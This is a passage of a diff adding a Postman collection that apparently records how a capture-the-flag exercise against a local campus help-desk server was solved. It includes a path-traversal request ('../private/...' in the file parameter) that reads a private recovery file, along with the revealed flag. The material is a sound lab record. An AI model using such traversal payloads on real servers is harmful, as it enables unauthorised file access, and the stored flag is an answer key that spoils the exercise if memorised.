+          "request": {
+            "method": "GET",
+            "header": [],
+            "body": {
+              "mode": "urlencoded",
+              "urlencoded": []
+            },
+            "url": {
+              "raw": "{{baseUrl}}/download?key=92a56d0d30510472028863ad1c510a5b&file=welcome.txt",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "download"
+              ],
+              "query": [
+                {
+                  "key": "key",
+                  "value": "92a56d0d30510472028863ad1c510a5b"
+                },
+                {
+                  "key": "file",
+                  "value": "welcome.txt"
+                }
+              ]
+            }
+          },
+          "response": [
+            {
+              "name": "Maybe cant directly ask for the file",
+              "originalRequest": {
+                "method": "GET",
+                "header": [],
+                "body": {
+                  "mode": "urlencoded",
+                  "urlencoded": []
+                },
+                "url": {
+                  "raw": "{{baseUrl}}/download?key=92a56d0d30510472028863ad1c510a5b&file=welcome.txt",
+                  "host": [
+                    "{{baseUrl}}"
+                  ],
+                  "path": [
+                    "download"
+                  ],
+                  "query": [
+                    {
+                      "key": "key",
+                      "value": "92a56d0d30510472028863ad1c510a5b"
+                    },
+                    {
+                      "key": "file",
+                      "value": "welcome.txt"
+                    }
+                  ]
+                }
+              },
+              "status": "OK",
+              "code": 200,
+              "_postman_previewlanguage": "text",
+              "header": [
+                {
+                  "key": "server",
+                  "value": "CampusHelpDesk/3.0"
+                },
+                {
+                  "key": "date",
+                  "value": "Mon, 26 Oct 2026 07:57:49 GMT"
+                },
+                {
+                  "key": "content-type",
+                  "value": "text/plain; charset=utf-8"
+                },
+                {
+                  "key": "content-length",
+                  "value": "210"
+                },
+                {
+                  "key": "cache-control",
+                  "value": "no-store"
+                },
+                {
+                  "key": "x-content-type-options",
+                  "value": "nosniff"
+                },
+                {
+                  "key": "content-security-policy",
+                  "value": "default-src 'self'; style-src 'unsafe-inline'; frame-ancestors 'none'"
+                }
+              ],
+              "cookie": [],
+              "body": "Orientation archive: public downloads are read from the public/ directory.\nRecovery documents are stored in its sibling private/ directory.\nThe staff escalation note records the current recovery document name.\n"
+            }
+          ]
+        },
+        {
+          "name": "get recovery.txt directly",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "body": {
+              "mode": "urlencoded",
+              "urlencoded": []
+            },
+            "url": {
+              "raw": "{{baseUrl}}/download?key=92a56d0d30510472028863ad1c510a5b&file=orientation-recovery-39a5975b500b5e4c.txt",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "download"
+              ],
+              "query": [
+                {
+                  "key": "key",
+                  "value": "92a56d0d30510472028863ad1c510a5b"
+                },
+                {
+                  "key": "file",
+                  "value": "orientation-recovery-39a5975b500b5e4c.txt"
+                }
+              ]
+            }
+          },
+          "response": [
+            {
+              "name": "yep cant access directly",
+              "originalRequest": {
+                "method": "GET",
+                "header": [],
+                "body": {
+                  "mode": "urlencoded",
+                  "urlencoded": []
+                },
+                "url": {
+                  "raw": "{{baseUrl}}/download?key=92a56d0d30510472028863ad1c510a5b&file=orientation-recovery-39a5975b500b5e4c.txt",
+                  "host": [
+                    "{{baseUrl}}"
+                  ],
+                  "path": [
+                    "download"
+                  ],
+                  "query": [
+                    {
+                      "key": "key",
+                      "value": "92a56d0d30510472028863ad1c510a5b"
+                    },
+                    {
+                      "key": "file",
+                      "value": "orientation-recovery-39a5975b500b5e4c.txt"
+                    }
+                  ]
+                }
+              },
+              "status": "OK",
+              "code": 200,
+              "_postman_previewlanguage": "text",
+              "header": [
+                {
+                  "key": "server",
+                  "value": "CampusHelpDesk/3.0"
+                },
+                {
+                  "key": "date",
+                  "value": "Mon, 26 Oct 2026 07:57:49 GMT"
+                },
+                {
+                  "key": "content-type",
+                  "value": "text/plain; charset=utf-8"
+                },
+                {
+                  "key": "content-length",
+                  "value": "210"
+                },
+                {
+                  "key": "cache-control",
+                  "value": "no-store"
+                },
+                {
+                  "key": "x-content-type-options",
+                  "value": "nosniff"
+                },
+                {
+                  "key": "content-security-policy",
+                  "value": "default-src 'self'; style-src 'unsafe-inline'; frame-ancestors 'none'"
+                }
+              ],
+              "cookie": [],
+              "body": "Orientation archive: public downloads are read from the public/ directory.\nRecovery documents are stored in its sibling private/ directory.\nThe staff escalation note records the current recovery document name.\n"
+            }
+          ]
+        },
+        {
+          "name": "get recovery.txt with change directory",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "body": {
+              "mode": "urlencoded",
+              "urlencoded": []
+            },
+            "url": {
+              "raw": "{{baseUrl}}/download?key=92a56d0d30510472028863ad1c510a5b&file=../private/orientation-recovery-39a5975b500b5e4c.txt",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "download"
+              ],
+              "query": [
+                {
+                  "key": "key",
+                  "value": "92a56d0d30510472028863ad1c510a5b"
+                },
+                {
+                  "key": "file",
+                  "value": "../private/orientation-recovery-39a5975b500b5e4c.txt"
+                }
+              ]
+            }
+          },
+          "response": [
+            {
+              "name": "The FLAGGGGGG :))))))",
+              "originalRequest": {
+                "method": "GET",
+                "header": [],
+                "body": {
+                  "mode": "urlencoded",
+                  "urlencoded": []
+                },
+                "url": {
+                  "raw": "{{baseUrl}}/download?key=92a56d0d30510472028863ad1c510a5b&file=../private/orientation-recovery-39a5975b500b5e4c.txt",
+                  "host": [
+                    "{{baseUrl}}"
+                  ],
+                  "path": [
+                    "download"
+                  ],
+                  "query": [
+                    {
+                      "key": "key",
+                      "value": "92a56d0d30510472028863ad1c510a5b"
+                    },
+                    {
+                      "key": "file",
+                      "value": "../private/orientation-recovery-39a5975b500b5e4c.txt"
+                    }
+                  ]
+                }
+              },
+              "status": "OK",
+              "code": 200,
+              "_postman_previewlanguage": "text",
+              "header": [
+                {
+                  "key": "server",
+                  "value": "CampusHelpDesk/3.0"
+                },
+                {
+                  "key": "date",
+                  "value": "Mon, 26 Oct 2026 08:07:25 GMT"
+                },
+                {
+                  "key": "content-type",
+                  "value": "text/plain; charset=utf-8"
+                },
+                {
+                  "key": "content-length",
+                  "value": "198"
+                },
+                {
+                  "key": "cache-control",
+                  "value": "no-store"
+                },
+                {
+                  "key": "x-content-type-options",
+                  "value": "nosniff"
+                },
+                {
+                  "key": "content-security-policy",
+                  "value": "default-src 'self'; style-src 'unsafe-inline'; frame-ancestors 'none'"
+                }
+              ],
+              "cookie": [],
+              "body": "Orientation welcome pack: recovery code found.\nSend this final code to the course teacher with your investigation notes.\nCTF{final_47c98140fc84fbd9bf08b307933d4b4b_ebcabfd8faa97b7eb19f25a2919c6b09}\n"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "variable": [
+    {
+      "key": "baseUrl",
+      "value": "http://127.0.0.1:8080"
+    }
+  ]
+}
